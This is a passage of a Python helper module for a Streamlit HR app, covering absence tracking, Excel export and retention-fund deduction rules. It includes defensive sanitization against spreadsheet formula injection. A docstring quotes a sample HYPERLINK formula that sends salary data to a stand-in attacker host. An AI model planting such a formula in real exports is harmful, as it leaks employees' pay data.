"""
Shared utility functions for the HR Assistant app.
Keeping all business-logic / calculation functions here (instead of inside
each page) makes the app easier to maintain and test.
"""

import io
import os
import json
from datetime import date, datetime
import pandas as pd
import streamlit as st


# --------------------------------------------------------------------------
# Navigation helpers
# --------------------------------------------------------------------------

def hide_default_sidebar_nav():
    """Hides Streamlit's automatic multipage sidebar list, so navigation is
    driven entirely by the nav cards / nav bar we render ourselves."""
    st.markdown(
        """
        <style>
        [data-testid="stSidebarNav"] {display: none;}
        </style>
        """,
        unsafe_allow_html=True,
    )


# NOTE: keep this in sync with the actual files under pages/. Every entry
# here becomes a st.page_link() call in render_top_nav() below - an entry
# pointing at a file that doesn't exist will raise an error, and an active
# page missing from this list simply won't get a nav link.
PAGES = [
    {"path": "pages/0_Login.py", "label": "Login", "icon": "🔐"},
    {"path": "Home.py", "label": "Home", "icon": "🗂️"},
    {"path": "pages/1_Long_Absence_Tracker.py", "label": "Long Absence Tracker", "icon": "📅"},
    {"path": "pages/2_Retention_Fund.py", "label": "Retention Fund", "icon": "💰"},
    {"path": "pages/3_Payroll_Calculator.py", "label": "Payroll Calculator", "icon": "🧾"},
    {"path": "pages/4_Employee_Database.py", "label": "Employee Database", "icon": "👥"},
    {"path": "pages/7_Shift_management.py", "label": "Shift Management", "icon": "🕒"},
]


def render_top_nav(active_label: str):
    """Renders a simple horizontal row of page links at the top of a page,
    used instead of the default sidebar navigation list.

    This now also shows a small user status area on the right with a logout
    button when the user is logged in."""
    hide_default_sidebar_nav()
    # extra column at the end reserved for user status / logout
    cols = st.columns(len(PAGES) + 1)
    for col, page in zip(cols[:-1], PAGES):
        with col:
            if page["label"] == active_label:
                st.markdown(f"**{page['icon']} {page['label']}**")
            else:
                st.page_link(page["path"], label=page["label"], icon=page["icon"])

    # right-most column: user status and logout
    with cols[-1]:
        if st.session_state.get("logged_in"):
            user = st.session_state.get("user")
            st.markdown(f"**👤 {user}**")
            if st.button("Logout"):
                # clear login-related session state keys (preserve app data)
                for k in ["logged_in", "user", "role"]:
                    if k in st.session_state:
                        del st.session_state[k]
                st.experimental_rerun()
        else:
            st.markdown("Not logged in")

    st.divider()


# --------------------------------------------------------------------------
# Generic helpers
# --------------------------------------------------------------------------

def read_any_table(uploaded_file) -> pd.DataFrame:
    """Read an uploaded .csv / .xlsx / .xls file, always treating the first
    row as the header row. Returns a cleaned DataFrame (strips whitespace
    from column names)."""
    if uploaded_file is None:
        return pd.DataFrame()

    name = uploaded_file.name.lower()
    if name.endswith(".csv"):
        df = pd.read_csv(uploaded_file, header=0)
    else:
        df = pd.read_excel(uploaded_file, header=0, engine="openpyxl")

    df.columns = [str(c).strip() for c in df.columns]
    return df


def to_excel_bytes(sheets: dict) -> bytes:
    """Convert a dict of {sheet_name: DataFrame} into an in-memory .xlsx file
    and return the raw bytes, ready for st.download_button.

    Every sheet is passed through `sanitize_dataframe_for_export()` first so
    that no exported file can carry a formula-injection payload (a common
    way sensitive data gets silently exfiltrated when a report is later
    re-opened in Excel/Sheets by someone else)."""
    buffer = io.BytesIO()
    with pd.ExcelWriter(buffer, engine="xlsxwriter") as writer:
        for sheet_name, df in sheets.items():
            safe_name = str(sheet_name)[:31]  # Excel sheet name limit
            sanitize_dataframe_for_export(df).to_excel(writer, index=False, sheet_name=safe_name)
    return buffer.getvalue()


def download_button_for_df(df: pd.DataFrame, label: str, file_name: str, key: str = None):
    st.download_button(
        label=label,
        data=to_excel_bytes({"Sheet1": df}),
        file_name=file_name,
        mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        key=key,
    )


# --------------------------------------------------------------------------
# Data-leak / security hardening
# --------------------------------------------------------------------------

_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")


def sanitize_dataframe_for_export(df: pd.DataFrame) -> pd.DataFrame:
    """Neutralizes CSV/Excel formula-injection payloads before any data
    leaves the app as a downloadable file.

    If a cell value (typically from an uploaded sheet) starts with =, +, -,
    or @, Excel/Sheets will treat it as a formula when the exported file is
    reopened. A malicious cell like `=HYPERLINK("http://evil.com/"&A1,"x")`
    can silently exfiltrate adjacent salary data the moment someone opens
    the report. Prefixing such cells with a leading apostrophe forces them
    to render as plain text instead of executing.

    This only rewrites string cells that start with a trigger character —
    numbers, dates, and normal text are left untouched.
    """
    out = df.copy()
    for col in out.columns:
        if pd.api.types.is_object_dtype(out[col]) or pd.api.types.is_string_dtype(out[col]):
            out[col] = out[col].apply(
                lambda v: ("'" + v) if isinstance(v, str) and v.startswith(_FORMULA_TRIGGER_CHARS) else v
            )
    return out


def safe_error_message(exc: Exception, context: str = "processing your data") -> str:
    """Returns a generic, user-facing error message that never echoes raw
    exception text back into the UI. Exception messages can accidentally
    contain fragments of the underlying data (e.g. a bad cell value quoted
    inside a pandas/KeyError message) — showing that verbatim in st.error
    is itself a small data leak. Log `exc` server-side via your own logging
    setup if you need the details; don't display it to end users.
    """
    return f"⚠️ Something went wrong while {context}. Please check your file's columns and format and try again."


SENSITIVE_SESSION_KEYS = [
    "employee_db",
    "fulltime_data",
    "payroll_result",
    "gig_data",
    "gig_result",
    "retention_fund_data",
    "retention_result",
    "consolidated_paysheets",
    "consolidated_paysheet_result",
    "consolidated_paysheet_summary",
]


def clear_sensitive_session_data():
    """Wipes all cached salary/employee data out of session_state. Streamlit
    keeps session_state in server memory for as long as the browser tab's
    session is alive — calling this lets you deliberately purge sensitive
    payroll data once you're done with it, rather than leaving it sitting
    in memory (e.g. on a shared workstation)."""
    for key in SENSITIVE_SESSION_KEYS:
        if key in st.session_state:
            del st.session_state[key]


def render_clear_data_button(label: str = "🔒 Clear cached data from this session"):
    if st.button(label):
        clear_sensitive_session_data()
        st.success("Session data cleared.")
        st.rerun()


# --------------------------------------------------------------------------
# 1. Long Absence Tracking
# --------------------------------------------------------------------------

def sample_attendance_muster() -> pd.DataFrame:
    """Small example attendance muster for download, showing the expected
    shape: employee identifier columns first (Employee ID, Employee Name,
    Branch), followed by one column per day with attendance marks
    (P=Present, A=Absent, WO=Weekly Off, L=Leave).

    This mirrors the row/column layout the Long Absence Tracker page
    expects — copy this shape when preparing your real muster."""
    days = [f"Day{i}" for i in range(1, 11)]

    rows = [
        {
            "Employee ID": "E001",
            "Employee Name": "Ravi Kumar",
            "Branch": "Koramangala",
            **dict(zip(days, ["P", "P", "A", "P", "P", "WO", "P", "A", "P", "P"])),
        },
        {
            "Employee ID": "E002",
            "Employee Name": "Sita Sharma",
            "Branch": "Koramangala",
            **dict(zip(days, ["P", "P", "P", "P", "P", "WO", "P", "P", "P", "P"])),
        },
        {
            "Employee ID": "E003",
            "Employee Name": "Mohan Das",
            "Branch": "Whitefield",
            **dict(zip(days, ["A", "A", "A", "A", "A", "WO", "A", "A", "A", "A"])),
        },
    ]
    return pd.DataFrame(rows)


def count_absences(df: pd.DataFrame, id_cols: list, absence_marker: str = "A") -> pd.DataFrame:
    """Given an attendance muster where `id_cols` identify the employee and
    all other columns are day-wise attendance marks, count how many times
    `absence_marker` (default 'A') appears for each employee."""
    day_cols = [c for c in df.columns if c not in id_cols]

    def count_row(row):
        vals = row[day_cols].astype(str).str.strip().str.upper()
        return (vals == absence_marker.upper()).sum()

    result = df[id_cols].copy()
    result["Total_Absent_Days"] = df.apply(count_row, axis=1)
    result["Total_Days_In_Muster"] = len(day_cols)
    return result


def categorize_absences(df: pd.DataFrame, thresholds: list) -> pd.DataFrame:
    """thresholds: list of (label, min_days, max_days_or_None) tuples,
    evaluated in order. max_days_or_None means "and above".
    Adds a 'Absence_Category' column to df (based on Total_Absent_Days).
    """

    def classify(days):
        for label, min_d, max_d in thresholds:
            if max_d is None:
                if days >= min_d:
                    return label
            else:
                if min_d <= days <= max_d:
                    return label
        return "Not Flagged"

    out = df.copy()
    out["Absence_Category"] = out["Total_Absent_Days"].apply(classify)
    return out


DEFAULT_ABSENCE_THRESHOLDS = [
    ("Informed Leave (3-4 days)", 3, 4),
    ("To Be Checked (5-20 days)", 5, 20),
    ("Probable Exit Case (>20 days)", 21, None),
]



# --------------------------------------------------------------------------
# 2. Retention Fund — First Hire Date based design
# --------------------------------------------------------------------------
# IMPORTANT: Everything above this section belongs to the existing shared
# util.py and is intentionally left unchanged. The helpers below are only for
# the Retention Fund module. Older public helper names/signatures are retained
# where practical so other pages that import util.py do not break.
#
# Current Retention Fund flow:
#   * No Internal Transfer logic.
#   * First Hire Date is the only hire-date basis.
#   * A single "full book" paysheet is uploaded with Wage Month on every row.
#   * Retention can be deducted only in employment months 1, 2 and 3.
#   * Deduction for an eligible month = min(10% of Monthly Gross, Net Pay).
#   * Customize rules are keyed by Branch + Company Code + Designation.
#   * No deduction for excluded Company Codes, Exceptional ERPs,
#     Non-Full Time employees, or Retention Applicable = No.
#   * Expected Release Date = First Hire Date + admin-selected release days.
#   * Release Due = 3 deductions completed AND Expected Release Date reached.

DEFAULT_IGNORED_COMPANY_CODES = []

_APP_ROOT = os.path.dirname(os.path.abspath(__file__))
_DATA_DIR = os.path.join(_APP_ROOT, "..", "data")
_IGNORED_CC_FILE = os.path.join(_DATA_DIR, "ignored_company_codes.json")
_EXCEPTIONAL_ERP_FILE = os.path.join(_DATA_DIR, "exceptional_erps.json")
_CUSTOMIZE_DASHBOARD_FILE = os.path.join(_DATA_DIR, "customize_dashboard.json")

EMPLOYMENT_TYPE_OPTIONS = ["Full Time", "Non-Full Time"]
RETENTION_APPLICABLE_OPTIONS = ["Yes", "No"]

CUSTOMIZE_KEY_COLUMNS = ["Branch", "Company Code", "Designation"]
CUSTOMIZE_DASHBOARD_COLUMNS = [
    "Branch",
    "Designation",
    "Company Code",
    "Employment Type",
    "Retention Applicable",
]

# Public name retained for compatibility. The new full-book format includes
# Wage Month because the payroll month varies row by row inside one file.
CONSOLIDATED_PAYSHEET_COLUMNS = [
    "ERP",
    "First Hire Date",
    "Wage Month",
    "Net Pay",
    "Monthly Gross",
]
EMPLOYEE_MASTER_COLUMNS = ["ERP", "Branch", "Designation", "Company Code"]


def _retention_clean_text(value) -> str:
    if value is None:
        return ""
    try:
        if pd.isna(value):
            return ""
    except Exception:
        pass
    return str(value).strip()


def _retention_normalise_key_series(series: pd.Series) -> pd.Series:
    return series.fillna("").astype(str).str.strip().str.upper()


def normalise_retention_employment_type(value) -> str:
    """Normalize old/new labels to Full Time or Non-Full Time."""
    text = _retention_clean_text(value).lower().replace("_", " ")
    text = " ".join(text.split())
    if text in {"full time", "full-time", "fulltime", "ft"}:
        return "Full Time"
    if text in {
        "non full time", "non-full time", "non-full-time", "nonfulltime",
        "gig", "gig worker", "part time", "part-time", "parttime",
        "consultant", "contractual", "contractor", "contract worker",
        "contract", "temporary", "temp",
    }:
        return "Non-Full Time"
    return "Full Time"


def normalise_retention_applicable(value, employment_type=None) -> str:
    """Normalize the editable Retention Applicable setting to Yes/No."""
    text = _retention_clean_text(value).lower()
    if text in {"yes", "y", "true", "1"}:
        return "Yes"
    if text in {"no", "n", "false", "0"}:
        return "No"
    return "Yes" if normalise_retention_employment_type(employment_type) == "Full Time" else "No"


def retention_applicable_from_employment_type(value) -> str:
    return "Yes" if normalise_retention_employment_type(value) == "Full Time" else "No"


def retention_remark_from_employment_type(value) -> str:
    if normalise_retention_employment_type(value) == "Full Time":
        return "Retention Eligible - Full Time"
    return "No Deduction - Non-Full Time"


# --------------------------------------------------------------------------
# Company Code exclusions
# --------------------------------------------------------------------------

def load_ignored_company_codes() -> list:
    if not os.path.exists(_IGNORED_CC_FILE):
        return list(DEFAULT_IGNORED_COMPANY_CODES)
    try:
        with open(_IGNORED_CC_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list):
            return sorted({
                _retention_clean_text(v).upper()
                for v in data
                if _retention_clean_text(v)
            })
    except Exception:
        pass
    return list(DEFAULT_IGNORED_COMPANY_CODES)


def save_ignored_company_codes(codes: list):
    os.makedirs(_DATA_DIR, exist_ok=True)
    clean = sorted({
        _retention_clean_text(v).upper()
        for v in (codes or [])
        if _retention_clean_text(v)
    })
    with open(_IGNORED_CC_FILE, "w", encoding="utf-8") as f:
        json.dump(clean, f, indent=2)


def sample_ignored_company_code_bulk_template() -> pd.DataFrame:
    return pd.DataFrame({"Company Code": ["COMPANY_A", "COMPANY_B"]})


def merge_ignored_company_code_bulk_upload(
    existing_codes: list,
    upload_df: pd.DataFrame,
    company_code_col: str = "Company Code",
) -> list:
    if upload_df is None or company_code_col not in upload_df.columns:
        raise ValueError("Company Code exclusion upload must contain a Company Code column.")
    uploaded = {
        _retention_clean_text(v).upper()
        for v in upload_df[company_code_col].tolist()
        if _retention_clean_text(v)
    }
    existing = {
        _retention_clean_text(v).upper()
        for v in (existing_codes or [])
        if _retention_clean_text(v)
    }
    return sorted(existing | uploaded)


# --------------------------------------------------------------------------
# Exceptional ERP exclusions
# --------------------------------------------------------------------------

def load_exceptional_erps() -> list:
    if not os.path.exists(_EXCEPTIONAL_ERP_FILE):
        return []
    try:
        with open(_EXCEPTIONAL_ERP_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list):
            return sorted({
                _retention_clean_text(v).upper()
                for v in data
                if _retention_clean_text(v)
            })
    except Exception:
        pass
    return []


def save_exceptional_erps(erps: list):
    os.makedirs(_DATA_DIR, exist_ok=True)
    clean = sorted({
        _retention_clean_text(v).upper()
        for v in (erps or [])
        if _retention_clean_text(v)
    })
    with open(_EXCEPTIONAL_ERP_FILE, "w", encoding="utf-8") as f:
        json.dump(clean, f, indent=2)


def sample_exceptional_erp_bulk_template() -> pd.DataFrame:
    return pd.DataFrame({"ERP": ["ERP00123", "ERP00456"]})


def merge_exceptional_erp_bulk_upload(
    existing_erps: list,
    upload_df: pd.DataFrame,
    erp_col: str = "ERP",
) -> list:
    if upload_df is None or erp_col not in upload_df.columns:
        raise ValueError("Exceptional ERP upload must contain an ERP column.")
    uploaded = {
        _retention_clean_text(v).upper()
        for v in upload_df[erp_col].tolist()
        if _retention_clean_text(v)
    }
    existing = {
        _retention_clean_text(v).upper()
        for v in (existing_erps or [])
        if _retention_clean_text(v)
    }
    return sorted(existing | uploaded)


# --------------------------------------------------------------------------
# Customize Dashboard — Branch + Company Code + Designation rule master
# --------------------------------------------------------------------------

def _prepare_customize_dashboard(df: pd.DataFrame) -> pd.DataFrame:
    if df is None:
        df = pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)
    out = df.copy()
    for col in CUSTOMIZE_DASHBOARD_COLUMNS:
        if col not in out.columns:
            out[col] = None
    for col in ["Branch", "Designation", "Company Code"]:
        out[col] = out[col].apply(_retention_clean_text)
    out["Employment Type"] = out["Employment Type"].apply(normalise_retention_employment_type)
    out["Retention Applicable"] = out.apply(
        lambda row: normalise_retention_applicable(
            row.get("Retention Applicable"), row.get("Employment Type")
        ),
        axis=1,
    )
    valid = out["Branch"].ne("") & out["Company Code"].ne("") & out["Designation"].ne("")
    out = out.loc[valid, CUSTOMIZE_DASHBOARD_COLUMNS].copy()
    if out.empty:
        return pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)
    out["__branch_key"] = _retention_normalise_key_series(out["Branch"])
    out["__cc_key"] = _retention_normalise_key_series(out["Company Code"])
    out["__designation_key"] = _retention_normalise_key_series(out["Designation"])
    out = out.drop_duplicates(
        subset=["__branch_key", "__cc_key", "__designation_key"], keep="last"
    )
    return out.drop(columns=["__branch_key", "__cc_key", "__designation_key"]).reset_index(drop=True)


def load_customize_dashboard() -> pd.DataFrame:
    if not os.path.exists(_CUSTOMIZE_DASHBOARD_FILE):
        return pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)
    try:
        with open(_CUSTOMIZE_DASHBOARD_FILE, "r", encoding="utf-8") as f:
            records = json.load(f)
        return _prepare_customize_dashboard(pd.DataFrame(records))
    except Exception:
        return pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)


def save_customize_dashboard(df: pd.DataFrame):
    os.makedirs(_DATA_DIR, exist_ok=True)
    out = _prepare_customize_dashboard(df)
    with open(_CUSTOMIZE_DASHBOARD_FILE, "w", encoding="utf-8") as f:
        json.dump(out.to_dict(orient="records"), f, indent=2, default=str)


def sample_customize_dashboard_bulk_template() -> pd.DataFrame:
    return pd.DataFrame([
        {"Branch": "Koramangala", "Company Code": "MAIN", "Designation": "Teacher"},
        {"Branch": "Whitefield", "Company Code": "MAIN", "Designation": "Principal"},
    ])


def merge_customize_dashboard_bulk_upload(
    existing_df: pd.DataFrame,
    upload_df: pd.DataFrame,
    erp_col: str = None,
    branch_col: str = "Branch",
    cc_col: str = "Company Code",
    designation_col: str = "Designation",
) -> pd.DataFrame:
    if upload_df is None:
        raise ValueError("Customize upload is empty.")
    required = [branch_col, cc_col, designation_col]
    missing = [c for c in required if c not in upload_df.columns]
    if missing:
        raise ValueError(f"Customize upload is missing required column(s): {', '.join(missing)}")

    existing = _prepare_customize_dashboard(existing_df)
    existing_map = {}
    for _, row in existing.iterrows():
        key = (
            _retention_clean_text(row["Branch"]).upper(),
            _retention_clean_text(row["Company Code"]).upper(),
            _retention_clean_text(row["Designation"]).upper(),
        )
        existing_map[key] = row.to_dict()

    rows = []
    for _, row in upload_df.iterrows():
        branch = _retention_clean_text(row.get(branch_col))
        company_code = _retention_clean_text(row.get(cc_col))
        designation = _retention_clean_text(row.get(designation_col))
        if not branch or not company_code or not designation:
            continue
        key = (branch.upper(), company_code.upper(), designation.upper())
        prior = existing_map.get(key, {})
        employment_type = normalise_retention_employment_type(
            prior.get("Employment Type") or "Full Time"
        )
        retention_applicable = normalise_retention_applicable(
            prior.get("Retention Applicable"), employment_type
        )
        rows.append({
            "Branch": branch,
            "Designation": designation,
            "Company Code": company_code,
            "Employment Type": employment_type,
            "Retention Applicable": retention_applicable,
        })

    uploaded = pd.DataFrame(rows, columns=CUSTOMIZE_DASHBOARD_COLUMNS)
    if uploaded.empty:
        return existing

    def _add_key(frame):
        frame = frame.copy()
        frame["__key"] = list(zip(
            _retention_normalise_key_series(frame["Branch"]),
            _retention_normalise_key_series(frame["Company Code"]),
            _retention_normalise_key_series(frame["Designation"]),
        ))
        return frame

    old = _add_key(existing)
    new = _add_key(uploaded)
    new_keys = set(new["__key"].tolist())
    untouched = old.loc[~old["__key"].isin(new_keys)].drop(columns="__key")
    return _prepare_customize_dashboard(
        pd.concat([untouched, new.drop(columns="__key")], ignore_index=True)
    )


def upsert_customize_dashboard_rule(
    existing_df: pd.DataFrame,
    branch: str,
    designation: str,
    company_code: str,
    employment_type: str = "Full Time",
    retention_applicable: str = "Yes",
) -> pd.DataFrame:
    branch = _retention_clean_text(branch)
    designation = _retention_clean_text(designation)
    company_code = _retention_clean_text(company_code)
    if not branch or not designation or not company_code:
        raise ValueError("Branch, Designation and Company Code are required.")
    one = pd.DataFrame([{
        "Branch": branch,
        "Designation": designation,
        "Company Code": company_code,
        "Employment Type": normalise_retention_employment_type(employment_type),
        "Retention Applicable": normalise_retention_applicable(retention_applicable, employment_type),
    }])
    return _prepare_customize_dashboard(pd.concat([
        _prepare_customize_dashboard(existing_df), one
    ], ignore_index=True))


# --------------------------------------------------------------------------
# General helpers retained for compatibility
# --------------------------------------------------------------------------

def get_payroll_cycle(reference_date=None) -> tuple:
    """Returns (cycle_start, cycle_end) for the 26th -> 25th payroll cycle."""
    if reference_date is None:
        reference_date = date.today()
    if isinstance(reference_date, datetime):
        reference_date = reference_date.date()
    if reference_date.day >= 26:
        cycle_start = date(reference_date.year, reference_date.month, 26)
        end_month = reference_date.month + 1
        end_year = reference_date.year
        if end_month > 12:
            end_month = 1
            end_year += 1
        cycle_end = date(end_year, end_month, 25)
    else:
        start_month = reference_date.month - 1
        start_year = reference_date.year
        if start_month < 1:
            start_month = 12
            start_year -= 1
        cycle_start = date(start_year, start_month, 26)
        cycle_end = date(reference_date.year, reference_date.month, 25)
    return cycle_start, cycle_end


def format_date_ddmmmyyyy(value) -> str:
    if value is None:
        return ""
    try:
        if isinstance(value, float) and pd.isna(value):
            return ""
        dt_value = pd.to_datetime(value)
        if pd.isna(dt_value):
            return ""
        return dt_value.strftime("%d-%b-%Y")
    except Exception:
        return ""


def pending_deduction_sentence(label: str, pending_df: pd.DataFrame, name_col: str) -> str:
    count = len(pending_df)
    if count == 0:
        return f"**{label}**: No deductions pending."
    if count == 1:
        emp_name = pending_df.iloc[0][name_col] if name_col in pending_df.columns else "employee"
        return f"**{label}**: 1 deduction pending with employee {emp_name}."
    return f"**{label}**: {count} deductions pending."


def coerce_numeric_column(series: pd.Series, column_name: str = "value") -> pd.Series:
    """Clean currency/text-formatted numeric columns and validate bad cells."""
    if pd.api.types.is_numeric_dtype(series):
        return pd.to_numeric(series, errors="coerce")
    cleaned = series.astype(str).str.replace(r"[₹$,\s]", "", regex=True).str.strip()
    cleaned = cleaned.replace({"": None, "nan": None, "None": None, "NaT": None})
    numeric = pd.to_numeric(cleaned, errors="coerce")
    original_nonblank = series.notna() & series.astype(str).str.strip().ne("")
    bad_mask = numeric.isna() & original_nonblank
    if bad_mask.any():
        bad_rows = series[bad_mask]
        examples = ", ".join(f"row {i + 2}: '{v}'" for i, v in bad_rows.head(5).items())
        more = f" (+{bad_mask.sum() - 5} more)" if bad_mask.sum() > 5 else ""
        raise ValueError(
            f"Column '{column_name}' has {bad_mask.sum()} value(s) that are not valid numbers — "
            f"e.g. {examples}{more}. Please fix these cells and re-upload."
        )
    return numeric


# --------------------------------------------------------------------------
# Full-book paysheet parsing / employee-master enrichment
# --------------------------------------------------------------------------

def sample_consolidated_paysheet_template() -> pd.DataFrame:
    """Sample of the new single-file full-book format."""
    return pd.DataFrame([
        {"ERP": "E001", "First Hire Date": "2026-07-15", "Wage Month": "2026-07", "Net Pay": 21000, "Monthly Gross": 25000},
        {"ERP": "E001", "First Hire Date": "2026-07-15", "Wage Month": "2026-08", "Net Pay": 21500, "Monthly Gross": 25000},
        {"ERP": "E001", "First Hire Date": "2026-07-15", "Wage Month": "2026-09", "Net Pay": 22000, "Monthly Gross": 25000},
        {"ERP": "E002", "First Hire Date": "2026-09-05", "Wage Month": "2026-09", "Net Pay": 900, "Monthly Gross": 15000},
    ])


def _retention_resolve_column(df: pd.DataFrame, aliases: list):
    if df is None or len(df.columns) == 0:
        return None
    normalized = {str(c).strip().lower(): c for c in df.columns}
    for alias in aliases:
        key = str(alias).strip().lower()
        if key in normalized:
            return normalized[key]
    for col in df.columns:
        col_key = str(col).strip().lower()
        for alias in aliases:
            alias_key = str(alias).strip().lower()
            if alias_key and alias_key in col_key:
                return col
    return None


def _parse_retention_date_value(value):
    """Parse common Excel/date text values without treating YYYYMM as nanoseconds."""
    if value is None:
        return pd.NaT
    try:
        if pd.isna(value):
            return pd.NaT
    except Exception:
        pass

    if isinstance(value, (pd.Timestamp, datetime, date)):
        return pd.Timestamp(value)

    text = str(value).strip()
    if not text:
        return pd.NaT

    # Common wage-month compact form: 202609.
    if text.endswith(".0") and text[:-2].isdigit():
        text = text[:-2]
    if len(text) == 6 and text.isdigit():
        year = int(text[:4])
        month = int(text[4:])
        if 1900 <= year <= 2200 and 1 <= month <= 12:
            return pd.Timestamp(year=year, month=month, day=1)

    # Excel serial date, when a sheet stores the raw serial rather than date formatting.
    try:
        numeric = float(text.replace(",", ""))
        if 20000 <= numeric <= 80000:
            return pd.Timestamp("1899-12-30") + pd.to_timedelta(int(numeric), unit="D")
    except Exception:
        pass

    for fmt in (
        "%Y-%m-%d", "%Y/%m/%d", "%Y.%m.%d",
        "%d-%m-%Y", "%d/%m/%Y", "%d.%m.%Y",
        "%Y-%m", "%Y/%m", "%b-%Y", "%b-%y", "%B-%Y", "%B-%y", "%m-%Y", "%m/%Y",
    ):
        try:
            return pd.to_datetime(text, format=fmt)
        except Exception:
            pass

    try:
        return pd.to_datetime(text, errors="coerce", dayfirst=True)
    except Exception:
        return pd.NaT


def parse_retention_date_series(series: pd.Series) -> pd.Series:
    return series.apply(_parse_retention_date_value)


def parse_wage_month_series(series: pd.Series) -> pd.Series:
    parsed = parse_retention_date_series(series)
    return parsed.dt.to_period("M").dt.to_timestamp()


def normalise_employee_master(employee_master: pd.DataFrame = None) -> pd.DataFrame:
    if employee_master is None or employee_master.empty:
        return pd.DataFrame(columns=EMPLOYEE_MASTER_COLUMNS)
    aliases = {
        "ERP": ["ERP", "Employee ID", "Employee Id", "Employee Code", "Emp Code", "EmployeeCode", "Emp ID", "ERP Code"],
        "Branch": ["Branch", "Current Branch", "Curr.Branch", "Curr Branch", "Branch Name", "Location", "Current Location"],
        "Designation": ["Designation", "Current Designation", "Curr.Designation", "Curr Designation", "Role", "Job Title", "Position"],
        "Company Code": ["Company Code", "CompanyCode", "Comp Code", "Company", "Company_Code", "Entity Code"],
    }
    resolved = {name: _retention_resolve_column(employee_master, options) for name, options in aliases.items()}
    missing = [name for name, source in resolved.items() if source is None]
    if missing:
        return pd.DataFrame(columns=EMPLOYEE_MASTER_COLUMNS)
    out = employee_master[[resolved[c] for c in EMPLOYEE_MASTER_COLUMNS]].copy()
    out.columns = EMPLOYEE_MASTER_COLUMNS
    out["ERP"] = out["ERP"].apply(_retention_clean_text)
    for col in ["Branch", "Designation", "Company Code"]:
        out[col] = out[col].apply(_retention_clean_text)
    out = out.loc[out["ERP"].ne("")]
    out["__erp_key"] = _retention_normalise_key_series(out["ERP"])
    return out.drop_duplicates("__erp_key", keep="last").drop(columns="__erp_key").reset_index(drop=True)


def _attach_employee_profile(paysheet: pd.DataFrame, erp_col: str, employee_master: pd.DataFrame = None) -> pd.DataFrame:
    out = paysheet.copy()
    out[erp_col] = out[erp_col].apply(_retention_clean_text)
    profile_columns = ["Branch", "Designation", "Company Code"]
    for col in profile_columns:
        if col not in out.columns:
            out[col] = ""
        out[col] = out[col].apply(_retention_clean_text)

    master = normalise_employee_master(employee_master)
    if not master.empty:
        master = master.copy()
        master["__erp_key"] = _retention_normalise_key_series(master["ERP"])
        master = master.drop_duplicates("__erp_key", keep="last").set_index("__erp_key")
        erp_keys = _retention_normalise_key_series(out[erp_col])
        for col in profile_columns:
            mapped = erp_keys.map(master[col])
            blank = out[col].eq("")
            out.loc[blank, col] = mapped.loc[blank].fillna("")

    out["Employee Master Mapping Missing"] = (
        out["Branch"].eq("") | out["Designation"].eq("") | out["Company Code"].eq("")
    )
    return out


def _attach_customize_rule(out: pd.DataFrame, customize_dashboard: pd.DataFrame = None) -> pd.DataFrame:
    rules = _prepare_customize_dashboard(customize_dashboard)
    result = out.copy()
    result["__branch_key"] = _retention_normalise_key_series(result["Branch"])
    result["__cc_key"] = _retention_normalise_key_series(result["Company Code"])
    result["__designation_key"] = _retention_normalise_key_series(result["Designation"])

    if rules.empty:
        result["Employment Type"] = None
        result["Retention Applicable"] = None
        result["Customize Rule Matched"] = False
        return result.drop(columns=["__branch_key", "__cc_key", "__designation_key"])

    rules = rules.copy()
    rules["__branch_key"] = _retention_normalise_key_series(rules["Branch"])
    rules["__cc_key"] = _retention_normalise_key_series(rules["Company Code"])
    rules["__designation_key"] = _retention_normalise_key_series(rules["Designation"])
    rules["Customize Rule Matched"] = True
    result = result.merge(
        rules[[
            "__branch_key", "__cc_key", "__designation_key",
            "Employment Type", "Retention Applicable", "Customize Rule Matched",
        ]],
        on=["__branch_key", "__cc_key", "__designation_key"],
        how="left",
    )
    result["Customize Rule Matched"] = result["Customize Rule Matched"].eq(True)
    return result.drop(columns=["__branch_key", "__cc_key", "__designation_key"])


def _retention_month_difference(wage_month: pd.Series, first_hire_date: pd.Series) -> pd.Series:
    wage_num = wage_month.dt.year * 12 + wage_month.dt.month
    hire_num = first_hire_date.dt.year * 12 + first_hire_date.dt.month
    return wage_num - hire_num


def _deduction_stage_from_index(month_index):
    if pd.isna(month_index):
        return ""
    try:
        month_index = int(month_index)
    except Exception:
        return ""
    return {
        0: "First Month Deduction",
        1: "Second Month Deduction",
        2: "Final Month Deduction",
    }.get(month_index, "")


def _retention_exclusion_reason(row) -> str:
    """Return the first business-rule reason that blocks retention eligibility."""
    if row.get("Employee Master Mapping Missing", False):
        return "Employee Master Mapping Missing"
    if row.get("Company Code Excluded", False):
        return "Excluded Company Code"
    if row.get("Exceptional ERP", False):
        return "Exceptional ERP"
    if not row.get("Customize Rule Matched", False):
        return "Customize Rule Missing"
    if normalise_retention_employment_type(row.get("Employment Type")) != "Full Time":
        return "Non-Full Time"
    if str(row.get("Retention Applicable", "")).strip().lower() != "yes":
        return "Retention Not Applicable"
    return "Eligible"


# --------------------------------------------------------------------------
# New primary engine: one full-book paysheet with Wage Month per row
# --------------------------------------------------------------------------

def process_retention_paysheet(
    paysheet_df: pd.DataFrame,
    exceptional_erps: list = None,
    customize_dashboard: pd.DataFrame = None,
    employee_master: pd.DataFrame = None,
    ignored_company_codes: list = None,
    release_days: int = 340,
    release_review_date=None,
    deduction_pct: float = 10.0,
) -> tuple:
    """Process one retention full book and return (ERP summary, row detail).

    Required source columns after standardization:
      ERP, First Hire Date, Wage Month, Net Pay, Monthly Gross

    The source may contain many Wage Months and many rows per ERP, but only one
    row per ERP + Wage Month is allowed. The earliest valid First Hire Date in
    the uploaded full book becomes the canonical First Hire Date for that ERP.

    Deduction is calculated only for employment month indexes 0, 1 and 2
    (First, Second and Final Month Deduction). The calculated deduction count
    therefore comes from the uploaded historical full book rather than from
    employee age alone.
    """
    if paysheet_df is None or paysheet_df.empty:
        return pd.DataFrame(), pd.DataFrame()
    if float(deduction_pct) != 10.0:
        raise ValueError("Retention Fund deduction percentage must be exactly 10%.")
    try:
        release_days = int(release_days)
    except Exception:
        raise ValueError("Release days must be a whole number.")
    if release_days < 0:
        raise ValueError("Release days cannot be negative.")

